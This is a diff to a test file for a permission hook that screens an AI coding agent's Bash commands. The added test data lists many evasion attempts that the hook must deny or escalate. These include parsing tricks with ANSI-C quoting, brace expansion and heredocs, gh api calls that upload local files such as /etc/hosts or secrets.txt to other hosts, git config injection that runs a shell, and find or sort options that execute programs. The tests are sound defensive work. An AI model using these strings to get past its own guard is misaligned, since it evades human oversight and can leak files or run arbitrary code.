@@ -22,10 +22,16 @@ HAS_APPOPSY = (VENV / "bin" / "appopsy").exists()
 
 
 def run_hook(
-    command: str, *, reviewer: bool = False, env: dict[str, str] | None = None
+    command: str,
+    *,
+    reviewer: bool = False,
+    env: dict[str, str] | None = None,
+    agent_type: str | None = None,
 ) -> str | None:
     """The hook's permission decision for a Bash command (None: no objection)."""
-    event = {"tool_name": "Bash", "tool_input": {"command": command}}
+    event: dict[str, object] = {"tool_name": "Bash", "tool_input": {"command": command}}
+    if agent_type:
+        event["agent_type"] = agent_type
     args = [sys.executable, "-I", str(HOOK), *(["--reviewer"] if reviewer else [])]
     out = subprocess.run(
         args,
@@ -59,13 +65,19 @@ ROUTINE = [
     "git status -sb",
     "git diff --name-only origin/main...HEAD",
     "git log -1 --format=%B",
+    "git log --oneline -5",
     "git add -A",
     "git add .claude docs/x.md",
     "git commit -q -m 'Fix the thing'",
-    "git commit -q -F - <<'EOF'\nmessage\nEOF",
+    "git commit -q -F - <<'EOF'\nmessage with \"quotes\", $vars, `ticks` and # signs\nEOF",
+    "git commit -q -F - <<'EOF'\nTitle\n\nCo-Authored-By: X <x@example.test>\nEOF\ngit log --oneline -1",
+    "git commit -am 'Fix #12: a {brace} and $HOME, literally'",
     "git switch -c fix-foo origin/main",
     "git checkout -b feature-x",
+    "git status\ngit diff --stat",
+    "cat ~/notes.txt",
     "echo hi",
+    "ls *.md",  # not a pre-approved command: the normal prompt decides
 ]
 
 NOT_ROUTINE = [
@@ -133,6 +145,52 @@ NOT_ROUTINE = [
     "uv run ruff check -o out.txt .",
     "uv run mypy --html-report /tmp/r",
     "uv run mypy --junit-xml out.xml",
+    # Second review: shell constructs shlex reads differently from bash
+    "git status\ngit commit -n -m x",
+    "gh api repos/o/r#x -X DELETE",
+    "gh api -X GET repos/o/r#c -X DELETE",
+    "git commit -m x#y -n",
+    "git commit $'-n' -m x",
+    "git diff $'--output=/tmp/x'",
+    "git diff --outp=x",
+    "git log --ext",
+    "git show --textc HEAD",
+    "gh api {-XDELETE,repos/o/r/git/refs/heads/x}",
+    "git add {-f,cases/}",
+    "git switch -c x {--discard-changes,}",
+    "git switch -c x --dis",
+    'git commit -m "$(cat msg.txt)"',
+    "git commit -n -F - <<EOF\nunquoted heredoc expands $x\nEOF",
+    "git commit -n -F - <<'EOF'\nsay \"hi\nEOF",
+    "git commit -m 'x' \\\n -n",
+    "git log -- *.py",
+    # Second review: gh api to other hosts or sending files
+    "gh api https://example.invalid/x -X GET -F a=@/etc/hosts",
+    "gh api --hostname example.invalid -X GET -F a=@f /x",
+    "gh api -X GET repos/o/r -f q=@secrets.txt",
+    "gh api //example.invalid/x",
+    # Second review: gh pr create forms that skipped the apps check
+    "gh pr create --fill",
+    "gh pr create --fill-first",
+    "gh pr create -T template.md",
+    "GH_REPO=other/repo gh pr create --title t --body b",
+    # Second review: env and global options in front of git
+    "GIT_CONFIG_PARAMETERS=\"'core.hooksPath=/x'\" git commit -m x",
+    "GIT_DIR=/elsewhere git commit -m x",
+    "git --config-env=diff.external=SHELL diff",
+    "git -C /elsewhere commit -m x",
+    # Second review: tool flags
+    "uv run mypy --install-types --non-interactive",
+    "uv run mypy --cache-dir /elsewhere",
+    "uv run pytest --log-file=/tmp/x",
+    "uv run pytest --debug=/tmp/x",
+    "uv run pytest --rootdir=/elsewhere",
+    "uv run pytest -c /other.ini",
+    "uv run pytest -p some_module",
+    "uv run pytest /elsewhere/tests",
+    "uv run pytest ../other/tests",
+    "uv run ruff check --fix /path/outside",
+    "uv run ruff clean",
 ]
 
 
@@ -163,6 +221,9 @@ def test_pr_text_naming_your_apps_asks(tmp_path: Path) -> None:
     clean = f"gh pr create --base main --title 'Parser fix' --body-file {body}"
     assert run_hook(clean, env=env) is None
     assert run_hook("gh pr create --title 'org.example.privateapp fix' --body x", env=env)
+    # Attached short forms are read too.
+    assert run_hook("gh pr create -tFix -borg.example.privateapp", env=env) == "ask"
+    assert run_hook("gh pr create -tFix -bText", env=env) is None
     body.write_text("Seen with org.example.privateapp.\n")
     assert run_hook(clean, env=env) == "ask"
     # Publishing the app list itself is the worst case.
@@ -213,6 +274,22 @@ REVIEWER_DENIED = [
     "echo $(whoami)",
     "sed -i s/a/b/ file",
     "adb shell getprop",
+    # Second review
+    "git status\ntouch y",
+    "git status\nuv run ruff format /tmp/x.py",
+    "find . -name a#b -delete",
+    "find . -maxdepth 0 $'-exec' curl x ';'",
+    "find . -name zzz $'-delete'",
+    "rg $'--pre=sh' x",
+    "echo hi $'>' x",
+    "git --config-env=diff.external=SHELL diff",
+    "sort -S 1 --compress-program=sh notes",
+    "sort -T /tmp notes",
+    "file -C -m x",
+    "uv run pytest --log-file=/tmp/x",
+    "uv run pytest --debug=/tmp/x",
+    "python3 -I /tmp/x/.claude/hooks/command_guard.py",
+    "uname -a",
 ]
 
 
@@ -224,6 +301,19 @@ def test_reviewer_read_only_commands_pass(command: str) -> None:
 @pytest.mark.parametrize("command", REVIEWER_DENIED)
 def test_reviewer_everything_else_is_denied(command: str) -> None:
     assert run_hook(command, reviewer=True) == "deny"
+
+
+@pytest.mark.parametrize("agent", ["privacy-reviewer", "allowlist-guard", "report-reader"])
+def test_reviewer_mode_follows_agent_type(agent: str) -> None:
+    # The settings.json hook also runs inside subagents; agent_type alone must be
+    # enough, in case a project agent's frontmatter hook is skipped.
+    assert run_hook("git commit -m x", agent_type=agent) == "deny"
+    assert run_hook("git diff --stat", agent_type=agent) is None
+
+
+def test_other_agents_get_main_mode() -> None:
+    assert run_hook("git commit -m x", agent_type="general-purpose") is None
+    assert run_hook("git commit -n -m x", agent_type="general-purpose") == "ask"
 
 
 def test_reviewer_mode_denies_unreadable_input() -> None:
